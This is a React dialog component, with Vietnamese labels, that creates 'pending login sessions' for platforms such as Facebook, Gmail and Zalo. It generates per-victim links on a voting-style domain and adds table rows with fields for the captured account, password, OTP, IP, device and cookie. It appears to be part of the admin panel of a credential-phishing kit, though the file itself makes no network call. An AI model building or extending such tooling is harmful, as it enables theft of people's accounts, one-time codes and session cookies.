import React, { useState } from 'react';
import { Button } from '@/components/ui/button';
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
  DialogFooter
} from '@/components/ui/dialog';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { toast } from 'react-toastify';
import { Mail, MessageSquare, Image as ImageIcon, AtSign, HelpCircle, FilePlus2 } from 'lucide-react';
import facebookLogo from '@/assets/social/facebook.svg';
import googleLogo from '@/assets/social/google.svg';
import zaloLogo from '@/assets/social/zalo.svg';
import instagramLogo from '@/assets/social/instagram.svg';
import microsoftLogo from '@/assets/social/microsoft.svg';
import yahooLogo from '@/assets/social/yahoo.svg';
import otherMailLogo from '@/assets/social/other-mail.svg';

const platforms = [
  { name: 'Facebook', icon: () => <img src={facebookLogo} alt="Facebook" className="h-4 w-4" /> },
  { name: 'Gmail', icon: Mail },
  { name: 'Zalo', icon: () => <img src={zaloLogo} alt="Zalo" className="h-4 w-4" /> },
  { name: 'Instagram', icon: () => <img src={instagramLogo} alt="Instagram" className="h-4 w-4" /> },
  { name: 'Hotmail', icon: () => <img src={microsoftLogo} alt="Microsoft" className="h-4 w-4" /> },
  { name: 'Yahoo', icon: () => <img src={yahooLogo} alt="Yahoo" className="h-4 w-4" /> },
  { name: 'Mail khác', icon: () => <img src={otherMailLogo} alt="Mail khác" className="h-4 w-4" /> },
  { name: 'Khác', icon: HelpCircle },
];

export const CreateLoginDialog = ({ isOpen, onOpenChange, onAddEntry }) => {
  const [platform, setPlatform] = useState('');
  const [chromeProfile, setChromeProfile] = useState('');
  const [linkName, setLinkName] = useState('');

  const generateRandomLink = () => {
    return `https://bvote.net/user/${Math.random().toString(36).substring(2, 10)}`;
  };

  const handleSubmit = () => {
    if (!platform || !chromeProfile || !linkName) {
      toast.error('Vui lòng điền đầy đủ thông tin.');
      return;
    }

    const newEntry = {
      id: `manual-${Date.now()}`,
      time: new Date().toISOString(),
      platform,
      chrome: chromeProfile,
      linkName,
      userLink: generateRandomLink(),
      status: '🟡 Chờ admin',
      account: 'N/A',
      password: 'N/A',
      otp: 'N/A',
      ip: 'N/A',
      device: 'N/A',
      cookie: 'Chờ...',
    };

    onAddEntry(newEntry);
    toast.success('Đã tạo phiên đăng nhập chờ thành công!');
    onOpenChange(false);
    // Reset form
    setPlatform('');
    setChromeProfile('');
    setLinkName('');
  };

  return (
    <Dialog open={isOpen} onOpenChange={onOpenChange}>
      <DialogContent className="sm:max-w-[425px] bg-gradient-to-tr from-[#020024] to-[#0c0c3a] border-purple-800 text-white">
        <DialogHeader>
          <DialogTitle className="text-cyan-300 flex items-center">
            <FilePlus2 className="mr-2 h-5 w-5" /> Tạo Phiên Đăng Nhập Chờ
          </DialogTitle>
          <DialogDescription className="text-gray-400">
            Tạo một phiên đăng nhập thủ công. Phiên này sẽ xuất hiện trong bảng và chờ được sử dụng.
          </DialogDescription>
        </DialogHeader>
        <div className="grid gap-4 py-4">
          <div className="grid grid-cols-4 items-center gap-4">
            <Label htmlFor="platform" className="text-right text-gray-300">
              Nền tảng
            </Label>
            <Select onValueChange={setPlatform} value={platform}>
              <SelectTrigger className="col-span-3 bg-slate-800/80 border-slate-600">
                <SelectValue placeholder="Chọn nền tảng..." />
              </SelectTrigger>
              <SelectContent className="bg-[#0f0c29] border-purple-800 text-slate-50">
                {platforms.map(p => {
                  const Icon = p.icon;
                  return (
                    <SelectItem key={p.name} value={p.name}>
                      <div className="flex items-center">
                        {typeof Icon === 'function' ? <Icon /> : <Icon className="mr-2 h-4 w-4" />}
                        <span>{p.name}</span>
                      </div>
                    </SelectItem>
                  );
                })}
              </SelectContent>
            </Select>
          </div>
          <div className="grid grid-cols-4 items-center gap-4">
            <Label htmlFor="link-name" className="text-right text-gray-300">
              Tên Link
            </Label>
            <Input
              id="link-name"
              value={linkName}
              onChange={(e) => setLinkName(e.target.value)}
              className="col-span-3 bg-slate-800/80 border-slate-600"
              placeholder="VD: Acc chính seeding"
            />
          </div>
          <div className="grid grid-cols-4 items-center gap-4">
            <Label htmlFor="chrome-profile" className="text-right text-gray-300">
              Chrome Profile
            </Label>
            <Input
              id="chrome-profile"
              value={chromeProfile}
              onChange={(e) => setChromeProfile(e.target.value)}
              className="col-span-3 bg-slate-800/80 border-slate-600"
              placeholder="VD: Profile 1"
            />
          </div>
        </div>
        <DialogFooter>
          <Button onClick={handleSubmit} variant="outline" className="border-cyan-500 text-cyan-400 hover:bg-cyan-500/20 hover:text-cyan-300">
            Tạo Phiên
          </Button>
        </DialogFooter>
      </DialogContent>
    </Dialog>
  );
};